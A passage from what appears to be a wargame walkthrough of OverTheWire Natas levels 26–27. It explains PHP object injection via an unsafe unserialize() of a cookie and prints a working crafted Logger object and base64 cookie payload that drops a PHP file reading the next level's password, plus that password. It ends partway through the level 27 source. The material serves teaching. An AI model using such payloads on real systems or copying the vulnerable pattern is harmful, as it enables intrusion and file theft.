</span><span class='line'>                        <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>                        <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y2&quot;</span><span class="p">,</span> <span class="nv">$object</span><span class="p">)){</span>
</span><span class='line'>
</span><span class='line'>                        <span class="nv">$color</span><span class="o">=</span><span class="nx">imagecolorallocate</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="mh">0xff</span><span class="p">,</span><span class="mh">0x12</span><span class="p">,</span><span class="mh">0x1c</span><span class="p">);</span>
</span><span class='line'>                        <span class="nx">imageline</span><span class="p">(</span><span class="nv">$img</span><span class="p">,</span><span class="nv">$object</span><span class="p">[</span><span class="s2">&quot;x1&quot;</span><span class="p">],</span><span class="nv">$object</span><span class="p">[</span><span class="s2">&quot;y1&quot;</span><span class="p">],</span>
</span><span class='line'>                                <span class="nv">$object</span><span class="p">[</span><span class="s2">&quot;x2&quot;</span><span class="p">]</span> <span class="p">,</span><span class="nv">$object</span><span class="p">[</span><span class="s2">&quot;y2&quot;</span><span class="p">]</span> <span class="p">,</span><span class="nv">$color</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>                    <span class="p">}</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">function</span> <span class="nf">storeData</span><span class="p">(){</span>
</span><span class='line'>        <span class="nv">$new_object</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>            <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)){</span>
</span><span class='line'>            <span class="nv">$new_object</span><span class="p">[</span><span class="s2">&quot;x1&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;x1&quot;</span><span class="p">];</span>
</span><span class='line'>            <span class="nv">$new_object</span><span class="p">[</span><span class="s2">&quot;y1&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;y1&quot;</span><span class="p">];</span>
</span><span class='line'>            <span class="nv">$new_object</span><span class="p">[</span><span class="s2">&quot;x2&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;x2&quot;</span><span class="p">];</span>
</span><span class='line'>            <span class="nv">$new_object</span><span class="p">[</span><span class="s2">&quot;y2&quot;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;y2&quot;</span><span class="p">];</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;drawing&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)){</span>
</span><span class='line'>            <span class="nv">$drawing</span><span class="o">=</span><span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;drawing&quot;</span><span class="p">]));</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">else</span><span class="p">{</span>
</span><span class='line'>            <span class="c1">// create new array</span>
</span><span class='line'>            <span class="nv">$drawing</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="nv">$drawing</span><span class="p">[]</span><span class="o">=</span><span class="nv">$new_object</span><span class="p">;</span>
</span><span class='line'>        <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&quot;drawing&quot;</span><span class="p">,</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$drawing</span><span class="p">)));</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>    <span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;drawing&quot;</span><span class="p">,</span> <span class="nv">$_COOKIE</span><span class="p">)</span> <span class="o">||</span>
</span><span class='line'>        <span class="p">(</span>   <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y1&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
</span><span class='line'>            <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))){</span>
</span><span class='line'>        <span class="nv">$imgfile</span><span class="o">=</span><span class="s2">&quot;img/natas26_&quot;</span> <span class="o">.</span> <span class="nb">session_id</span><span class="p">()</span> <span class="o">.</span><span class="s2">&quot;.png&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="nx">drawImage</span><span class="p">(</span><span class="nv">$imgfile</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">showImage</span><span class="p">(</span><span class="nv">$imgfile</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">storeData</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Code looks complicated so I&rsquo;m breaking it down in little pieces:</p>

<ul>
<li><p>We have a Logger class that writes some messages to a log file</p></li>
<li><p>the <em>showImage()</em> function sets the image tag source to the given filename, if that file exists</p></li>
<li><p>the <em>drawImage()</em> function creates an image and outputs it to the browser</p></li>
<li><p><em>drawFromUserdata()</em> uses the user-supplied coordinates to draw lines across the image</p></li>
<li><p><em>storeData()</em> populates an array with the 4 $_GET parameters and sets a cookie named <em>drawing</em> to contain the serialized and base64 encoded value of the previously created array</p></li>
</ul>


<p>So far, out of ideas, but when reading about <em>unserialize()</em> in the PHP manual, there was a security warning:</p>

<blockquote><p>Warning</p>

<p>Do not pass untrusted user input to unserialize(). Unserialization can result in code being loaded and executed due to object instantiation and
autoloading, and a malicious user may be able to exploit this. Use a safe, standard data interchange format such as JSON (via json_decode() and
json_encode()) if you need to pass serialized data to the user.</p></blockquote>

<p>Next I proceeded to read more about exploiting PHP unserialization, and there were quite a few resources available, so I must be on the right track :D And this also explained the existence of the Logger class, which isn&rsquo;t instantiated anywhere in the program. But first, we must understand what serialization is all about.</p>

<ul>
<li><p><em>string serialize ( mixed $value )</em></p></li>
<li><p>Generates a storable representation of a value. This is useful for storing or passing PHP values around without losing their type and structure. Returns a binary string containing a byte-stream representation of value that can be stored anywhere.</p></li>
</ul>


<p><strong>Serialization</strong> is the conversion of a PHP data structure to a string that can be passed to external applications, such as databases, or stored in files etc.</p>

<p><strong>Unserialization</strong> converts the string back to a PHP value</p>

<p>Now let&rsquo;s look at what OWASP says about the PHP object injection attack:</p>

<blockquote><p>The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP
allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP
object(s) injection into the application scope.</p>

<p>In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:</p>

<p>The application must have a class which implements a PHP magic method (such as <strong>wakeup or </strong>destruct) that can be used to carry out malicious
attacks, or to start a &ldquo;POP chain&rdquo;.</p>

<p>All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be
supported for such classes.</p></blockquote>

<p>Well, we can exploit this because both conditions apply to our case! Remember that we have the Logger class,  and it contains a <em>__construct()</em> and <em>__destruct()</em> magic method. So the class wasn&rsquo;t just lying around for nothing in the code, hehehe!</p>

<p>Before continuing, I want to show an <a href="http://www.w3resource.com/php/function-reference/serialize.php">example of serialization</a>, so you can have an idea of what it looks like with an easier to understand example than deciphering the <em>drawing</em> cookie:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$serialized_data</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;Math&#39;</span><span class="p">,</span> <span class="s1">&#39;Language&#39;</span><span class="p">,</span> <span class="s1">&#39;Science&#39;</span><span class="p">));</span>
</span><span class='line'><span class="k">echo</span>  <span class="nv">$serialized_data</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x">  </span>
</span></code></pre></td></tr></table></div></figure>


<p>And the output is <code>a:3:{i:0;s:4:&ldquo;Math&rdquo;;i:1;s:8:&ldquo;Language&rdquo;;i:2;s:7:&ldquo;Science&rdquo;;}</code>. Ugh, looks complicated! But here it is:</p>

<ul>
<li><p>a = array, 3 = the number of elements in the array</p></li>
<li><p>i = integer, 0 = index in the array, s = string, 4 = length of the string, Math is the element value, and this continues for the other elements as well</p></li>
</ul>


<p>Now, to exploit this. We have:</p>

<ul>
<li><p>a way to inject our own code into the application (by changing the <em>drawing</em> cookie that will get unserialized)</p></li>
<li><p>a way to write to a file (leverage the Logger class)</p></li>
<li><p>a way to read a file (we can browse to where images are stored inside <em>img/</em>)</p></li>
</ul>


<p>First, I made my own malicious Logger class:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">class</span> <span class="nc">Logger</span><span class="p">{</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$logFile</span><span class="p">;</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$initMsg</span><span class="p">;</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$exitMsg</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">function</span> <span class="nf">__construct</span><span class="p">(){</span>
</span><span class='line'>            <span class="c1">// initialise variables</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">initMsg</span><span class="o">=</span><span class="s2">&quot;pwn&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exitMsg</span><span class="o">=</span> <span class="s2">&quot;&lt;?php echo readfile(&#39;/etc/natas_webpass/natas27&#39;);?&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span> <span class="o">=</span> <span class="s2">&quot;img/pass.php&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">function</span> <span class="nf">__destruct</span><span class="p">(){</span>
</span><span class='line'>            <span class="c1">// write exit message</span>
</span><span class='line'>            <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">,</span><span class="s2">&quot;a+&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exitMsg</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="nv">$myobj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Logger</span><span class="p">();</span>
</span><span class='line'><span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$myobj</span><span class="p">));</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This code I wrote and tested on my local machine, first with local files, to see that it behaves as I want it to. When that was done, I used PHP to serialize and base64 encode it, so I can paste it in the cookie, and this is how it looks like:</p>

<ul>
<li>serialized:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>O:6:"Logger":3:{s:15:"LoggerlogFile";s:12:"img/pass.php";s:15:"LoggerinitMsg";s:3:"pwn";s:15:"LoggerexitMsg";s:52:"&lt;?php echo readfile('/etc/natas_webpass/natas27');?&gt;";}</span></code></pre></td></tr></table></div></figure>


<ul>
<li>base64 encoded:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Bhc3MucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MzoicHduIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTI6Ijw/cGhwIGVjaG8gcmVhZGZpbGUoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7Pz4iO30=</span></code></pre></td></tr></table></div></figure>


<p>In my Logger class I just removed what wasn&rsquo;t necessary from the original code, and made the modifications so that the script will create a PHP file inside the <em>img/</em> directory, with this code inside it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nb">readfile</span><span class="p">(</span><span class="s1">&#39;/etc/natas_webpass/natas27&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>And after changing the cookie and navigating to pass.php, the code gets executed and spits the password: <code>55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ</code></p>

<p>Because I used <em>readfile()</em>, I actually saw the password followed by a space and 33 (the length of read data). I looked in the PHP manual and noticed saw that <em>file_get_contents()</em> is a better choice for reading a file into a string, but I was too lazy to change it!</p>

<blockquote><p>file_get_contents() is the preferred way to read the contents of a file into a string.</p></blockquote>

<p>Helpful resources:</p>

<p><a href="https://stackoverflow.com/questions/8641889/how-to-use-php-serialize-and-unserialize">PHP serialization</a></p>

<p><a href="https://www.owasp.org/index.php/PHP_Object_Injection">OWASP PHP Object Injection</a></p>

<p><a href="https://www.notsosecure.com/2015/09/24/remote-code-execution-via-php-unserialize/">RCE with PHP unserialize</a></p>

<p><a href="https://vagosec.org/2013/09/wordpress-php-object-injection/">PHP object injection</a></p>

<p><a href="https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf">unserialize() exploitation</a></p>

<h3>Level 27</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas14.png" title="natas27" alt="natas 27"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// morla / 10111</span>
</span><span class='line'><span class="c1">// database gets cleared every 5 min</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">CREATE TABLE `users` (</span>
</span><span class='line'><span class="cm">  `username` varchar(64) DEFAULT NULL,</span>
</span><span class='line'><span class="cm">  `password` varchar(64) DEFAULT NULL</span>
</span><span class='line'><span class="cm">);</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">checkCredentials</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$usr</span><span class="p">,</span><span class="nv">$pass</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$password</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT username from users where username=&#39;</span><span class="si">$user</span><span class="s2">&#39; and password=&#39;</span><span class="si">$password</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
</span><span class='line'>        <span class="k">return</span> <span class="k">True</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">validUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$usr</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * from users where username=&#39;</span><span class="si">$user</span><span class="s2">&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">return</span> <span class="k">True</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">dumpData</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$usr</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * from users where username=&#39;</span><span class="si">$user</span><span class="s2">&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>                <span class="c1">//thanks to Gobo for reporting this bug!</span>
</span><span class='line'>                <span class="c1">//return print_r($row);</span>
</span><span class='line'>                <span class="k">return</span> <span class="nb">print_r</span><span class="p">(</span><span class="nv">$row</span><span class="p">,</span><span class="k">true</span><span class="p">);</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">createUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$usr</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$password</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO users (username,password) values (&#39;</span><span class="si">$user</span><span class="s2">&#39;,&#39;</span><span class="si">$password</span><span class="s2">&#39;)&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_affected_rows</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
</span><span class='line'>        <span class="k">return</span> <span class="k">True</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">)</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;password&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;natas27&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">&#39;natas27&#39;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nx">validUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//user exists, check creds</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nx">checkCredentials</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">],</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">])){</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;Welcome &quot;</span> <span class="o">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;!&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;Here is your data:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$data</span><span class="o">=</span><span class="nx">dumpData</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]);</span>
</span><span class='line'>            <span class="k">print</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">else</span><span class="p">{</span>
